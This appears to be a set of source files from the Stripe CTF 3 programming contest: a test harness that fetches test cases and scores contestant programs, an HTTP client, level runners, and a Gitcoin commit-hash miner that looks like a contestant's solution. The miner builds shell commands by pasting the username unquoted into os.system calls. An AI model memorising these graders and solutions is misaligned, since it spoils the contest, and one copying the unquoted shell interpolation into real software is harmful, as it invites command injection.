        self.test_cases = map(lambda token: TestCase(self, token), ids_or_urls)
        self.options = options
        headers = {
            'User-Agent': 'Stripe TestHarness/%s' % (self.VERSION,),
        }
        self.http_client = http_client.new_default_http_client(headers=headers, verify_ssl_certs=True)

    def fetch_s3_resource(self, url):
        try:
            content, status_code = self.http_client.request("get", url)
        except error.HTTPConnectionError:
            err = util.exception_as()
            msg = ("There was an error while connecting to fetch "
                   "the url %s. Please check your connectivity. If there "
                   "continues to be an issue, please let us know at "
                   "ctf@stripe.com. The specific error is:\n" % (url,))
            raise error.StripeError(msg + str(err))
        if status_code == 200:
            return content
        elif status_code == 403:
            msg = ("We received a 403 while fetching the url %s. "
                   "This probably means that you are trying to get "
                   "something that doesn't actually exist." % (url,))
            raise error.StripeError(msg)
        else:
            msg = ("We received the unexpected response code %i while "
                   "fetching the url %s." % (status_code, url,))
            raise error.StripeError(msg)

    def run(self):
        task = self.options["task"]

        if task == "execute":
            test_cases_to_execute = self.load_test_cases()
            self.execute(test_cases_to_execute)
        else:
            raise StandardError("Unrecognized task " +  task)

    def test_cases_path(self):
        return os.path.join(
            data_directory,
            "downloaded_test_cases",
            "version%i" % self.VERSION)

    def flush_test_cases(self):
        util.logger.info('Flushing. Path: %s', self.test_cases_path())
        for test_case in self.test_cases:
            test_case.flush(self.test_cases_path())

    def add_test_case(self, test_case):
        self.test_cases.append(test_case)

    def load_test_cases(self):
        loaded_test_cases = []
        for test_case in self.test_cases:
            result = test_case.load()
            if not result: continue
            test_case.flush()
            loaded_test_cases.append(test_case)
        return loaded_test_cases

    def hook_preexecute(self):
        # May override
        pass

    def execute(self, test_cases_to_execute):
        self.hook_preexecute()
        runner = self.hook_create_runner()

        for test_case in test_cases_to_execute:
            if self.options["raw"]:
                util.logger.info(runner.run_test_case_raw(test_case.json))
            else:
                runner.run_test_case(test_case.json)

class AbstractRunner(object):
    def __init__(self, options):
        pass

    # may override
    def code_directory(self):
        return os.path.join(os.path.dirname(__file__), "..")

    def log_diff(self, benchmark_output, user_output):
        util.logger.info("Here is the head of your output:")
        util.logger.info(user_output[0:1000])
        diff = list(difflib.Differ().compare(benchmark_output.splitlines(True),
                                             user_output.splitlines(True)))
        lines = filter(lambda line: line[0] != "?", diff[0:20])
        util.logger.info("\n***********\n")
        util.logger.info("Here is the head of the diff between your output and the benchmark:")
        util.logger.info("".join(lines))

    def run_build_sh(self):
        util.logger.info("Building your code via `build.sh`.")
        build_runner = subprocess.Popen([
            os.path.join(self.code_directory(), "build.sh")],
            stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        # Blocks
        stdout, stderr = build_runner.communicate()
        if build_runner.returncode == 0:
            util.logger.info("Done building your code.")
        else:
            util.logger.info("Build failed with code %i. Stderr:", build_runner.returncode)
            util.logger.info(stderr)

    # may override
    def hook_prerun(self):
        pass

    def run_test_case(self, test_case):
        self.hook_prerun()
        id = test_case['id']
        util.logger.info("About to run test case: %s" % id)
        input = test_case['input']
        result = self.run_input(input)
        return self.report_result(test_case, result)

    def run_test_case_raw(self, test_case):
        self.hook_prerun()
        input = test_case['input']
        result = self.run_input(input)
        return result['output']

    def run_input(self, input):
        util.logger.info("Beginning run.")
        output = self.run_subprocess_command(self.subprocess_command(), input)
        util.logger.info('Finished run')
        return output

    def report_stderr(self, stderr):
        if not stderr: return
        util.logger.info("Standard error from trial run:")
        util.logger.info(stderr)

    def subprocess_communicate(self, runner, input):
        if sys.version_info >= (3, 0):
            input = input.encode('utf-8')
        stdout, stderr = runner.communicate(input)
        if sys.version_info >= (3, 0):
            stderr = stderr.decode('utf-8')
            stdout = stdout.decode('utf-8')
        return stdout, stderr

    def run_subprocess_command(self, command, input):
        start_time = time.time()
        runner = subprocess.Popen(command, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        stdout, stderr = self.subprocess_communicate(runner, input)
        end_time = time.time()
        return {
            'wall_clock_time': end_time - start_time,
            'output': stdout,
            'input': input,
            'level': self.LEVEL,
            'exitstatus': runner.returncode,
            }

########NEW FILE########
__FILENAME__ = util
import logging
import os
from random import SystemRandom
import sys

logger = logging.getLogger('stripe')
logger.addHandler(logging.StreamHandler(sys.stdout))
logger.setLevel(logging.INFO)

__all__ = ['StringIO', 'json', 'utf8', 'random_letters', 'mkdir_p']

if sys.version_info < (3,0):
    # Used to interface with pycurl, which we only make available for
    # those Python versions
    try:
        import cStringIO as StringIO
    except ImportError:
        import StringIO

try:
    import json
except ImportError:
    json = None

if not (json and hasattr(json, 'loads')):
    try:
        import simplejson as json
    except ImportError:
        if not json:
            raise ImportError(
                "Stripe requires a JSON library, such as simplejson. "
                "HINT: Try installing the "
                "python simplejson library via 'pip install simplejson' or "
                "'easy_install simplejson'.")
        else:
            raise ImportError(
                "Stripe requires a JSON library with the same interface as "
                "the Python 2.6 'json' library.  You appear to have a 'json' "
                "library with a different interface.  Please install "
                "the simplejson library.  HINT: Try installing the "
                "python simplejson library via 'pip install simplejson' "
                "or 'easy_install simplejson'.")


def utf8(value):
    if sys.version_info < (3, 0) and isinstance(value, unicode):
        return value.encode('utf-8')
    else:
        return value

def random_letters(count=4):
    LETTERS = "abcdefghijklmnopqrstuvwxyz"
    output = []
    for i in range(0, count):
        output.append(SystemRandom().choice(LETTERS))
    return "".join(output)

# TODO: Python >2.5 ?
def mkdir_p(path):
    try:
        os.makedirs(path)
    except OSError:
        if os.path.isdir(path): pass
        else: raise

def exception_as():
    _, err, _ = sys.exc_info()
    return err

########NEW FILE########
__FILENAME__ = runner
import os.path

# From this package
import lib.error as error
import lib.test_framework as test_framework
import lib.util as util

class Runner(test_framework.AbstractRunner):
    LEVEL = 0

    def __init__(self, options):
        self.dictionary_path = options["dictionary_path"]
        super(Runner, self).__init__(options)

    def subprocess_command(self):
        return [self.executable_path(), self.dictionary_path]

    def executable_path(self):
        return os.path.join(os.path.dirname(__file__), "..", "level0")

    def report_result(self, test_case, result):
        benchmark_output = test_case['output']
        benchmark_time = test_case['wall_clock_time']

        your_output = result['output']
        your_time = result['wall_clock_time']

        returncode = result['exitstatus']

        if returncode != 0:
            util.logger.info('Your process exited uncleanly. Exit code: %i',
                        result['returncode'])
        elif benchmark_output == your_output:
            time_ratio = (your_time + 0.0) / benchmark_time
            msg = ("Test case passed. Your time: %(your_time)f seconds. Benchmark time: "
                   "%(benchmark_time)f seconds. You/Benchmark: %(time_ratio)f")
            util.logger.info(msg,
                        {"your_time": your_time,
                         "benchmark_time": benchmark_time,
                         "time_ratio": time_ratio}
                        )
        else:
            msg = ("Test case failed. Your time: %(your_time)f. "
                   "Benchmark time: %(benchmark_time)f")
            util.logger.error(msg, {"your_time": your_time, "benchmark_time": benchmark_time})
            self.log_diff(benchmark_output, your_output)

########NEW FILE########
__FILENAME__ = miner
#!/usr/bin/env python
# coding=utf-8

import hashlib
import os
import subprocess
import sys
import time

if len(sys.argv) < 3:
	print """Usage: ./miner.py <clone_url> <public_username>

Arguments:

<clone_url> is the string you’d pass to `git clone` (i.e.
  something of the form `username@hostname:path`)

<public_username> is the public username provided to you in
  the CTF web interface."""
	sys.exit(1)

clone_spec = sys.argv[1]
public_username = sys.argv[2]

def solve():

	# Start with a number with lots of digits so that the length of the commit
	# object can be predicted and is unlikely to ever increase (because we’ll
	# _probably_ have found a coin by then).
	nonce = 1000000000000000 # length=16

	#difficulty = '000001'
	with open('difficulty.txt', 'r') as f:
		difficulty = f.read().strip()

	tree = subprocess.check_output(['git', 'write-tree']).strip()
	with open('.git/refs/heads/master', 'r') as f:
		parent = f.read().strip()
	timestamp = int(time.time())
	print 'Mining…'
	base_hasher = hashlib.sha1()
	# The length of all such commit messages is 233, as long as the nonce is 16
	# digits long.
	header = "commit 233\x00"
	base_content = """tree %s
parent %s
author CTF user <me@example.com> 1333333337 +0000
committer CTF user <me@example.com> 1333333337 +0000

Give me a Gitcoin

""" % (tree, parent)
	base_hasher.update(header + base_content)

	while True:
		nonce = nonce + 1
		hasher = base_hasher.copy()
		noncestr = str(nonce)
		hasher.update(noncestr)
		content = base_content + noncestr
		sha1 = hasher.hexdigest()
		#print '>>%s<<' % sha1
		if sha1 < difficulty:
			with open('commit.txt', 'w') as f:
				f.write(content)
			print 'Mined a Gitcoin! The SHA-1 is:'
			os.system('git hash-object -t commit commit.txt -w')
			os.system('git reset --hard %s' % sha1)
			break

def prepare_index():
	os.system('perl -i -pe \'s/(%s: )(\d+)/$1 . ($2+1)/e\' LEDGER.txt' % public_username)
	os.system('grep -q "%s" LEDGER.txt || echo "%s: 1" >> LEDGER.txt' % (public_username, public_username))
	os.system('git add LEDGER.txt')

def reset():
	os.system('git fetch origin master >/dev/null 2>/dev/null')
	os.system('git reset --hard origin/master >/dev/null')

while True:
	prepare_index()
	solve()
	if os.system('git push origin master') == 0:
		print 'Success :)'
		break
	else:
		print 'Starting over :('
		reset()

########NEW FILE########
__FILENAME__ = error
# Exceptions
class StripeError(Exception):
    pass

class HTTPConnectionError(StripeError):
    pass

########NEW FILE########
__FILENAME__ = http_client
import os
import sys
import textwrap

# From this package
import lib.error as error
import lib.util as util

# This is a port of http_client from [Stripe-Python](https://github.com/stripe/stripe-python)

# - Requests is the preferred HTTP library
# - Use Pycurl if it's there (at least it verifies SSL certs)
# - Fall back to urllib2 with a warning if needed

try:
    if sys.version_info < (3,0):
        import urllib2 as urllib_request
    else:
        import urllib.request as urllib_request
except ImportError:
    pass

try:
    import pycurl
except ImportError:
    pycurl = None

try:
    import requests
except ImportError:
    requests = None
else:
    try:
        # Require version 0.8.8, but don't want to depend on distutils
        version = requests.__version__
        major, minor, patch = [int(i) for i in version.split('.')]
    except Exception:
        # Probably some new-fangled version, so it should support verify
        pass
    else:
        if (major, minor, patch) < (0, 8, 8):
            util.logger.warn(
                'Warning: the test harness will only use your Python "requests"'
                'library if it is version 0.8.8 or newer, but your '
                '"requests" library is version %s. We will fall back to '
                'an alternate HTTP library so everything should work. We '
                'recommend upgrading your "requests" library. (HINT: running '
                '"pip install -U requests" should upgrade your requests '
                'library to the latest version.)' % (version,))
            requests = None

def certs_path():
    return os.path.join(os.path.dirname(__file__), 'ca-certificates.crt')


def new_default_http_client(*args, **kwargs):
    if requests:
        impl = RequestsClient
    elif pycurl and sys.version_info < (3,0):
        # Officially supports in 3.1-3.3 but not 3.0. The idea is that for >=2.6
        # you should use requests
        impl = PycurlClient
    else:
        impl = Urllib2Client
        if sys.version_info < (2,6):
            reccomendation = "pycurl"
        else:
            reccomendation = "requests"
        util.logger.info(
            "Warning: The test harness is falling back to *urllib2*. "
            "Its SSL implementation doesn't verify server "
            "certificates (how's that for a distributed systems problem?). "
            "We recommend instead installing %(rec)s via `pip install %(rec)s`.",
            {'rec': reccomendation})

    return impl(*args, **kwargs)


class HTTPClient(object):

    def __init__(self, headers={}, verify_ssl_certs=True):
        self._verify_ssl_certs = verify_ssl_certs
        self.headers = headers

    def request(self, method, url, post_data=None):
        raise NotImplementedError(
            'HTTPClient subclasses must implement `request`')


class RequestsClient(HTTPClient):
    name = 'requests'

    def request(self, method, url, post_data=None):
        kwargs = {}

        if self._verify_ssl_certs:
            kwargs['verify'] = certs_path()
        else:
            kwargs['verify'] = False

        try:
            try:
                result = requests.request(method,
                                          url,
                                          headers=self.headers,
                                          data=post_data,
                                          timeout=80,
                                          **kwargs)
            except TypeError:
                e = util.exception_as()
                raise TypeError(
                    'Warning: It looks like your installed version of the '
                    '"requests" library is not compatible with Stripe\'s '
                    'usage thereof. (HINT: The most likely cause is that '
                    'your "requests" library is out of date. You can fix '
                    'that by running "pip install -U requests".) The '
                    'underlying error was: %s' % (e,))

            # This causes the content to actually be read, which could cause
            # e.g. a socket timeout. TODO: The other fetch methods probably
            # are succeptible to the same and should be updated.
            content = result.content
            status_code = result.status_code
        except Exception:
            # Would catch just requests.exceptions.RequestException, but can
            # also raise ValueError, RuntimeError, etc.
            e = util.exception_as()
            self._handle_request_error(e)
        if sys.version_info >= (3, 0):
            content = content.decode('utf-8')
        return content, status_code

    def _handle_request_error(self, e):
        if isinstance(e, requests.exceptions.RequestException):
            err = "%s: %s" % (type(e).__name__, str(e))
        else:
            err = "A %s was raised" % (type(e).__name__,)
            if str(e):
                err += " with error message %s" % (str(e),)
            else:
                err += " with no error message"
        msg = "Network error: %s" % (err,)
        raise error.HTTPConnectionError(msg)

class PycurlClient(HTTPClient):
    name = 'pycurl'

    def request(self, method, url, post_data=None):
        s = util.StringIO.StringIO()
        curl = pycurl.Curl()

        if method == 'get':
            curl.setopt(pycurl.HTTPGET, 1)
        elif method == 'post':
            curl.setopt(pycurl.POST, 1)
            curl.setopt(pycurl.POSTFIELDS, post_data)
        else:
            curl.setopt(pycurl.CUSTOMREQUEST, method.upper())

        # pycurl doesn't like unicode URLs
        curl.setopt(pycurl.URL, util.utf8(url))

        curl.setopt(pycurl.WRITEFUNCTION, s.write)
        curl.setopt(pycurl.NOSIGNAL, 1)
        curl.setopt(pycurl.CONNECTTIMEOUT, 30)
        curl.setopt(pycurl.TIMEOUT, 80)
        curl.setopt(pycurl.HTTPHEADER, ['%s: %s' % (k, v)
                    for k, v in self.headers.iteritems()])
        if self._verify_ssl_certs:
            curl.setopt(pycurl.CAINFO, certs_path())
        else:
            curl.setopt(pycurl.SSL_VERIFYHOST, False)

        try:
            curl.perform()
        except pycurl.error:
            e = util.exception_as()
            self._handle_request_error(e)
        rbody = s.getvalue()
        rcode = curl.getinfo(pycurl.RESPONSE_CODE)
        return rbody, rcode

    def _handle_request_error(self, e):
        error_code = e[0]
        if error_code in [pycurl.E_COULDNT_CONNECT,
                          pycurl.E_COULDNT_RESOLVE_HOST,
                          pycurl.E_OPERATION_TIMEOUTED]:
            msg = ("Test harness could not connect to Stripe. Please check "
                   "your internet connection and try again.")
        elif (error_code in [pycurl.E_SSL_CACERT,
                             pycurl.E_SSL_PEER_CERTIFICATE]):
            msg = "Could not verify host's SSL certificate."
        else:
            msg = ""
        msg = textwrap.fill(msg) + "\n\nNetwork error: %s" % e[1]
        raise error.HTTPConnectionError(msg)


class Urllib2Client(HTTPClient):
    if sys.version_info >= (3, 0):
        name = 'urllib.request'
    else:
        name = 'urllib2'

    def request(self, method, url, post_data=None):
        if sys.version_info >= (3, 0) and isinstance(post_data, str):
            post_data = post_data.encode('utf-8')

        req = urllib_request.Request(url, post_data, self.headers)

        if method not in ('get', 'post'):
            req.get_method = lambda: method.upper()

        try:
            response = urllib_request.urlopen(req)
            rbody = response.read()
            rcode = response.code
        except urllib_request.HTTPError:
            e = util.exception_as()
            rcode = e.code
            rbody = e.read()
        except (urllib_request.URLError, ValueError):
            e = util.exception_as()
            self._handle_request_error(e)
        if sys.version_info >= (3, 0):
            rbody = rbody.decode('utf-8')
        return rbody, rcode

    def _handle_request_error(self, e):
        msg = "Network error: %s" % str(e)
        raise error.HTTPConnectionError(msg)

########NEW FILE########
__FILENAME__ = test_framework
import difflib
import os.path
from random import SystemRandom
import re
import subprocess
import sys
import time

# From this package
import lib.error as error
import lib.http_client as http_client
import lib.util as util

data_directory = os.path.join(os.path.dirname(__file__), "..", "data")

class TestCase(object):
    def __init__(self, harness, id_or_url):
        self.harness = harness
        self.id, self.url = self.normalize_id_and_url(id_or_url)
        self.json = None

    def normalize_id_and_url(self, id_or_url):
        if re.match("\Ahttps?:", id_or_url):
            url = id_or_url
            # Look at the last component and remove extension
            id = id_or_url.split('/')[-1].split('.')[0]
        else:
            id = id_or_url
            level = self.harness.LEVEL
            url = "https://stripe-ctf-3.s3.amazonaws.com/level%s/%s.json" % (level, id)
        return id, url

    def dump_path(self):
        return os.path.join(self.harness.test_cases_path(), self.id + ".json")

    def load(self):
        if self.json: return self.json
        try:
            f = open(self.dump_path(), "r")
            self.json = util.json.load(f)
            f.close()
            return self.json
        except IOError:
            pass
        util.logger.info('Fetching. URL: %s', self.url)
        content = self.harness.fetch_s3_resource(self.url)
        try:
            self.json = util.json.loads(content)
        except ValueError:
            # Decoding the JSON failed.
            msg = ("There was a problem parsing the test case. We expected "
                   "JSON. We received: %s" % (content,))
            raise error.StripeError(msg)
        return self.json

    def flush(self):
        f = open(os.path.join(self.harness.test_cases_path(), self.id + ".json"), "w")
        util.json.dump(self.json, f)
        f.close()

class AbstractHarness(object):
    def __init__(self, ids_or_urls=[], options={}):
        util.mkdir_p(self.test_cases_path())
        if not os.path.isfile(http_client.certs_path()):
            msg = ("You seem to have deleted the file of certificates "
                   "that shipped with this repo. It should exist "
                   "at %s" % http_client.certs_path())
            raise error.StripeError(msg)
        if ids_or_urls == []:
            util.logger.info('No test case supplied. Randomly choosing among defaults.')
            ids_or_urls = [SystemRandom().choice(self.DEFAULT_TEST_CASES)]
        self.test_cases = map(lambda token: TestCase(self, token), ids_or_urls)
        self.options = options
        headers = {
            'User-Agent': 'Stripe TestHarness/%s' % (self.VERSION,),
        }
        self.http_client = http_client.new_default_http_client(headers=headers, verify_ssl_certs=True)

    def fetch_s3_resource(self, url):
        try:
            content, status_code = self.http_client.request("get", url)
        except error.HTTPConnectionError:
            err = util.exception_as()
            msg = ("There was an error while connecting to fetch "
                   "the url %s. Please check your connectivity. If there "
                   "continues to be an issue, please let us know at "
                   "ctf@stripe.com. The specific error is:\n" % (url,))
            raise error.StripeError(msg + str(err))
        if status_code == 200:
            return content
        elif status_code == 403:
            msg = ("We received a 403 while fetching the url %s. "
                   "This probably means that you are trying to get "
                   "something that doesn't actually exist." % (url,))
            raise error.StripeError(msg)
        else:
            msg = ("We received the unexpected response code %i while "
                   "fetching the url %s." % (status_code, url,))
            raise error.StripeError(msg)

    def run(self):
        task = self.options["task"]

        if task == "execute":
            test_cases_to_execute = self.load_test_cases()
            self.execute(test_cases_to_execute)
        else:
            raise StandardError("Unrecognized task " +  task)

    def test_cases_path(self):
        return os.path.join(
            data_directory,
            "downloaded_test_cases",
            "version%i" % self.VERSION)

    def flush_test_cases(self):
        util.logger.info('Flushing. Path: %s', self.test_cases_path())
        for test_case in self.test_cases:
            test_case.flush(self.test_cases_path())

    def add_test_case(self, test_case):
        self.test_cases.append(test_case)

    def load_test_cases(self):
        loaded_test_cases = []
        for test_case in self.test_cases:
            result = test_case.load()
            if not result: continue
            test_case.flush()
            loaded_test_cases.append(test_case)
        return loaded_test_cases

    def hook_preexecute(self):
        # May override
        pass

    def execute(self, test_cases_to_execute):
        self.hook_preexecute()
        runner = self.hook_create_runner()

        for test_case in test_cases_to_execute:
            if self.options["raw"]:
                util.logger.info(runner.run_test_case_raw(test_case.json))
            else:
                runner.run_test_case(test_case.json)

class AbstractRunner(object):
    def __init__(self, options):
        pass

    # may override
    def code_directory(self):
        return os.path.join(os.path.dirname(__file__), "..")

    def log_diff(self, benchmark_output, user_output):
        util.logger.info("Here is the head of your output:")
        util.logger.info(user_output[0:1000])
        diff = list(difflib.Differ().compare(benchmark_output.splitlines(True),
                                             user_output.splitlines(True)))
        lines = filter(lambda line: line[0] != "?", diff[0:20])
        util.logger.info("\n***********\n")
        util.logger.info("Here is the head of the diff between your output and the benchmark:")
        util.logger.info("".join(lines))

    def run_build_sh(self):
        util.logger.info("Building your code via `build.sh`.")
        build_runner = subprocess.Popen([
            os.path.join(self.code_directory(), "build.sh")],
            stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        # Blocks
        stdout, stderr = build_runner.communicate()
        if build_runner.returncode == 0:
            util.logger.info("Done building your code.")
        else:
            util.logger.info("Build failed with code %i. Stderr:", build_runner.returncode)
            util.logger.info(stderr)

    # may override
    def hook_prerun(self):
        pass

    def run_test_case(self, test_case):
        self.hook_prerun()
        id = test_case['id']
        util.logger.info("About to run test case: %s" % id)
        input = test_case['input']
        result = self.run_input(input)
        return self.report_result(test_case, result)

    def run_test_case_raw(self, test_case):
        self.hook_prerun()
        input = test_case['input']
        result = self.run_input(input)
        return result['output']

    def run_input(self, input):
        util.logger.info("Beginning run.")
        output = self.run_subprocess_command(self.subprocess_command(), input)
        util.logger.info('Finished run')
        return output

    def report_stderr(self, stderr):
        if not stderr: return
        util.logger.info("Standard error from trial run:")
        util.logger.info(stderr)

    def subprocess_communicate(self, runner, input):
        if sys.version_info >= (3, 0):
            input = input.encode('utf-8')
        stdout, stderr = runner.communicate(input)
        if sys.version_info >= (3, 0):
            stderr = stderr.decode('utf-8')
            stdout = stdout.decode('utf-8')
        return stdout, stderr

    def run_subprocess_command(self, command, input):
        start_time = time.time()
        runner = subprocess.Popen(command, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        stdout, stderr = self.subprocess_communicate(runner, input)
        end_time = time.time()
        return {
            'wall_clock_time': end_time - start_time,
            'output': stdout,
            'input': input,
            'level': self.LEVEL,
            'exitstatus': runner.returncode,
            }

########NEW FILE########
__FILENAME__ = util
import logging
import os
from random import SystemRandom
import sys

logger = logging.getLogger('stripe')
logger.addHandler(logging.StreamHandler(sys.stdout))
logger.setLevel(logging.INFO)

__all__ = ['StringIO', 'json', 'utf8', 'random_letters', 'mkdir_p']

if sys.version_info < (3,0):
    # Used to interface with pycurl, which we only make available for
    # those Python versions
    try:
        import cStringIO as StringIO
    except ImportError:
        import StringIO

try:
    import json
except ImportError:
    json = None

if not (json and hasattr(json, 'loads')):
    try:
        import simplejson as json
    except ImportError:
        if not json:
            raise ImportError(
                "Stripe requires a JSON library, such as simplejson. "
                "HINT: Try installing the "
                "python simplejson library via 'pip install simplejson' or "
                "'easy_install simplejson'.")
        else:
            raise ImportError(
                "Stripe requires a JSON library with the same interface as "
                "the Python 2.6 'json' library.  You appear to have a 'json' "
                "library with a different interface.  Please install "
                "the simplejson library.  HINT: Try installing the "
                "python simplejson library via 'pip install simplejson' "
                "or 'easy_install simplejson'.")


def utf8(value):
    if sys.version_info < (3, 0) and isinstance(value, unicode):
        return value.encode('utf-8')
    else:
        return value

def random_letters(count=4):
    LETTERS = "abcdefghijklmnopqrstuvwxyz"
    output = []
    for i in range(0, count):
        output.append(SystemRandom().choice(LETTERS))
    return "".join(output)

# TODO: Python >2.5 ?
def mkdir_p(path):
    try:
        os.makedirs(path)
    except OSError:
        if os.path.isdir(path): pass
        else: raise

def exception_as():
    _, err, _ = sys.exc_info()
    return err

########NEW FILE########
__FILENAME__ = runner
import os.path
import subprocess

# From this package
import lib.test_framework as test_framework
import lib.util as util

class Runner(test_framework.AbstractRunner):
    LEVEL = 2

    def __init__(self, options):
        super(Runner, self).__init__(options)
        self.secret = util.random_letters(16)
        self.client_port = "3000"
        self.backend_ports = ["3001", "3002"]
        self.results_path = os.path.join(
            test_framework.data_directory,
            "results-%s.json" % self.secret)

    def code_directory(self):
        return os.path.join(os.path.dirname(__file__), "..")

    def hook_prerun(self):
        self.run_build_sh()

    def read_result_file(self, path):
        try:
            f = open(path)
        except IOError:
            return None
        results = util.json.load(f)
        f.close()
        return results

    def score(self, results):
        return max(0.01, results['good_responses'] - results['backend_deficit'] / 8.0)

    def spinup_backend(self, port):
        return subprocess.Popen([
                os.path.join(self.code_directory(), "network_simulation", "backend.js"),
                "--secret", self.secret,
                "--in-port", port])

    # overrides
    def run_input(self, input):
        util.logger.info("Beginning run.")
        backend_runners = []
        for port in self.backend_ports:
            backend_runners.append(self.spinup_backend(port))
        shield_runner = subprocess.Popen([
            os.path.join(self.code_directory(), "shield"),
            "--in-port", self.client_port,
            "--out-ports", ",".join(self.backend_ports)])
        sword_runner = subprocess.Popen([
            os.path.join(self.code_directory(), "network_simulation", "sword.js"),
            "--secret", self.secret,
            "--out-port", self.client_port,
            "--results-path", self.results_path, input],
            stdin=subprocess.PIPE)
        # Blocks:
        stdout, stderr = sword_runner.communicate()
        for br in backend_runners: br.terminate()
        shield_runner.terminate()
        util.logger.info('Finished run')
        results = self.read_result_file(self.results_path)
        if results != None:
            output_dictionary = {
                'score': self.score(results),
                'good_responses': results['good_responses'],
                'backend_deficit': results['backend_deficit'],
                'correct': results['correct'],
                'results': results
                }
        else:
            output_dictionary = {
                'correct': False,
                'unclean_description': "`sword.js` did not write a results file"
                }
        output_dictionary.update({
            'input': input,
            'level': self.LEVEL,
            'exitstatus': sword_runner.returncode,
            })
        return output_dictionary

    def report_result(self, test_case, result):
        returncode = result['exitstatus']

        if returncode != 0:
            util.logger.info('Your `shield` exited uncleanly. Exit code: %i',
                             returncode)
        elif not result['correct']:
            util.logger.error("Test case failed. Reason: %s", result['unclean_description'])
        else:
            benchmark_score = test_case['score']
            your_score = result['score']
            score_ratio = (your_score + 0.0) / benchmark_score
            msg = ("Test case passed. Your score: %(your_score)f. Benchmark score: "
                   "%(benchmark_score)f. You/Benchmark: %(score_ratio)f.")
            util.logger.info(msg,
                             {"your_score": your_score,
                              "benchmark_score": benchmark_score,
                              "score_ratio": score_ratio}
                             )

########NEW FILE########
__FILENAME__ = error
# Exceptions
class StripeError(Exception):
    pass

class HTTPConnectionError(StripeError):
    pass

########NEW FILE########
__FILENAME__ = http_client
import os
import sys
import textwrap

# From this package
import lib.error as error
import lib.util as util

# This is a port of http_client from [Stripe-Python](https://github.com/stripe/stripe-python)

# - Requests is the preferred HTTP library
# - Use Pycurl if it's there (at least it verifies SSL certs)
# - Fall back to urllib2 with a warning if needed

try:
    if sys.version_info < (3,0):
        import urllib2 as urllib_request
    else:
        import urllib.request as urllib_request
except ImportError:
    pass

try:
    import pycurl
except ImportError:
    pycurl = None

try:
    import requests
except ImportError:
    requests = None
else:
    try:
        # Require version 0.8.8, but don't want to depend on distutils
        version = requests.__version__
        major, minor, patch = [int(i) for i in version.split('.')]
    except Exception:
        # Probably some new-fangled version, so it should support verify
        pass
    else:
        if (major, minor, patch) < (0, 8, 8):
            util.logger.warn(
                'Warning: the test harness will only use your Python "requests"'
                'library if it is version 0.8.8 or newer, but your '
                '"requests" library is version %s. We will fall back to '
                'an alternate HTTP library so everything should work. We '
                'recommend upgrading your "requests" library. (HINT: running '
                '"pip install -U requests" should upgrade your requests '
                'library to the latest version.)' % (version,))
            requests = None

def certs_path():
    return os.path.join(os.path.dirname(__file__), 'ca-certificates.crt')


def new_default_http_client(*args, **kwargs):
    if requests:
        impl = RequestsClient
    elif pycurl and sys.version_info < (3,0):
        # Officially supports in 3.1-3.3 but not 3.0. The idea is that for >=2.6
        # you should use requests
        impl = PycurlClient
    else:
        impl = Urllib2Client
        if sys.version_info < (2,6):
            reccomendation = "pycurl"
        else:
            reccomendation = "requests"
        util.logger.info(
            "Warning: The test harness is falling back to *urllib2*. "
            "Its SSL implementation doesn't verify server "
            "certificates (how's that for a distributed systems problem?). "
            "We recommend instead installing %(rec)s via `pip install %(rec)s`.",
            {'rec': reccomendation})

    return impl(*args, **kwargs)


class HTTPClient(object):

    def __init__(self, headers={}, verify_ssl_certs=True):
        self._verify_ssl_certs = verify_ssl_certs
        self.headers = headers

    def request(self, method, url, post_data=None):
        raise NotImplementedError(
            'HTTPClient subclasses must implement `request`')


class RequestsClient(HTTPClient):
    name = 'requests'

    def request(self, method, url, post_data=None):
        kwargs = {}

        if self._verify_ssl_certs:
            kwargs['verify'] = certs_path()
        else:
            kwargs['verify'] = False

        try:
            try:
                result = requests.request(method,
                                          url,
                                          headers=self.headers,
                                          data=post_data,
                                          timeout=80,
                                          **kwargs)
            except TypeError:
                e = util.exception_as()
                raise TypeError(
                    'Warning: It looks like your installed version of the '
                    '"requests" library is not compatible with Stripe\'s '
                    'usage thereof. (HINT: The most likely cause is that '
                    'your "requests" library is out of date. You can fix '
                    'that by running "pip install -U requests".) The '
                    'underlying error was: %s' % (e,))

            # This causes the content to actually be read, which could cause
            # e.g. a socket timeout. TODO: The other fetch methods probably
            # are succeptible to the same and should be updated.
            content = result.content
            status_code = result.status_code
        except Exception:
            # Would catch just requests.exceptions.RequestException, but can
            # also raise ValueError, RuntimeError, etc.
            e = util.exception_as()
            self._handle_request_error(e)
        if sys.version_info >= (3, 0):
            content = content.decode('utf-8')
        return content, status_code

    def _handle_request_error(self, e):
        if isinstance(e, requests.exceptions.RequestException):
            err = "%s: %s" % (type(e).__name__, str(e))
        else:
            err = "A %s was raised" % (type(e).__name__,)
            if str(e):
                err += " with error message %s" % (str(e),)
            else:
                err += " with no error message"
        msg = "Network error: %s" % (err,)
        raise error.HTTPConnectionError(msg)

class PycurlClient(HTTPClient):
    name = 'pycurl'

    def request(self, method, url, post_data=None):
        s = util.StringIO.StringIO()
        curl = pycurl.Curl()

        if method == 'get':
            curl.setopt(pycurl.HTTPGET, 1)
        elif method == 'post':
            curl.setopt(pycurl.POST, 1)
            curl.setopt(pycurl.POSTFIELDS, post_data)
        else:
            curl.setopt(pycurl.CUSTOMREQUEST, method.upper())

        # pycurl doesn't like unicode URLs
        curl.setopt(pycurl.URL, util.utf8(url))

        curl.setopt(pycurl.WRITEFUNCTION, s.write)
        curl.setopt(pycurl.NOSIGNAL, 1)
        curl.setopt(pycurl.CONNECTTIMEOUT, 30)
        curl.setopt(pycurl.TIMEOUT, 80)
        curl.setopt(pycurl.HTTPHEADER, ['%s: %s' % (k, v)
                    for k, v in self.headers.iteritems()])
        if self._verify_ssl_certs:
            curl.setopt(pycurl.CAINFO, certs_path())
        else:
            curl.setopt(pycurl.SSL_VERIFYHOST, False)

        try:
            curl.perform()
        except pycurl.error:
            e = util.exception_as()
            self._handle_request_error(e)
        rbody = s.getvalue()
        rcode = curl.getinfo(pycurl.RESPONSE_CODE)
        return rbody, rcode

    def _handle_request_error(self, e):
        error_code = e[0]
        if error_code in [pycurl.E_COULDNT_CONNECT,
                          pycurl.E_COULDNT_RESOLVE_HOST,
                          pycurl.E_OPERATION_TIMEOUTED]:
            msg = ("Test harness could not connect to Stripe. Please check "
                   "your internet connection and try again.")
        elif (error_code in [pycurl.E_SSL_CACERT,
                             pycurl.E_SSL_PEER_CERTIFICATE]):
